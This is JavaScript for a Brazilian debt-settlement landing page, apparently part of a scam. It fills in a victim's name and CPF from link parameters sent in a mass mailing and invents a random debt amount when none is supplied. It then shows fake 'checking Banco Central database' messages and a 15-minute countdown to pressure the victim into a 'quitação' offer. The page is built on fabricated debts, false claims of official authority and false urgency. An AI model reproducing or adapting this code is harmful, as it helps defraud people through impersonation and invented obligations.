lucide.createIcons(); // FUNÇÃO DE CAPTURA ULTRA-COMPATÍVEL function getParam(param) { const urlParams = new URLSearchParams(window.location.search); let value = urlParams.get(param); if (!value) return null; // Remove caracteres de placeholders comuns que podem ter sobrado do disparo // Exemplo: se vier {{nome}}, ele limpa para ficar apenas o nome return value.replace(/[{}]/g, '').trim(); } // Captura os dados const name = getParam('nome') || 'Cliente'; const cpf = getParam('cpf') || '000.000.000-00'; const divida = getParam('divida') || (Math.random() * (7000 - 1000) + 1000).toFixed(2).replace('.', ','); // Injeta nos elementos da página document.getElementById('user-name').innerText = name; document.getElementById('user-cpf').innerText = cpf; // Atualiza todas as instâncias no contrato document.querySelectorAll('.contract-name').forEach(el => el.innerText = name); document.querySelectorAll('.contract-cpf').forEach(el => el.innerText = cpf); function startAnalysis() { document.getElementById('loading').classList.remove('hidden-step'); const texts = [ "Acessando banco de dados do Banco Central...", "Verificando pendências no CPF " + cpf + "...", "Calculando isenção de juros e multas...", "Verificando elegibilidade de Margem de Crédito...", "Gerando proposta de quitação..." ]; let i = 0; const interval = setInterval(() => { document.getElementById('loading-text').innerText = texts[i]; i++; if(i >= texts.length) { clearInterval(interval); finishAnalysis(); } }, 1500); } function finishAnalysis() { const formattedDebt = divida.includes(',') ? `R$ ${divida}` : new Intl.NumberFormat('pt-BR', { style: 'currency', currency: 'BRL' }).format(parseFloat(divida.replace(',', '.'))); document.getElementById('debt-value').innerText = formattedDebt; document.getElementById('loading').classList.add('hidden-step'); document.getElementById('step-landing').classList.add('hidden-step'); document.getElementById('step-offer').classList.remove('hidden-step'); startTimer(); } function goNext(stepId) { document.getElementById('loading').classList.remove('hidden-step'); document.getElementById('loading-text').innerText = "Processando solicitação..."; setTimeout(() => { document.querySelectorAll('[id^="step-"]').forEach(div => div.classList.add('hidden-step')); document.getElementById('step-' + stepId).classList.remove('hidden-step'); document.getElementById('loading').classList.add('hidden-step'); window.scrollTo(0, 0); }, 1000); } function startTimer() { let timeLeft = 899; const timerElement = document.getElementById('timer'); setInterval(() => { if (timeLeft <= 0) return; timeLeft--; const mins = Math.floor(timeLeft / 60); const secs = timeLeft % 60; timerElement.innerText = `${mins}:${secs < 10 ? '0' : ''}${secs}`; }, 1000); }
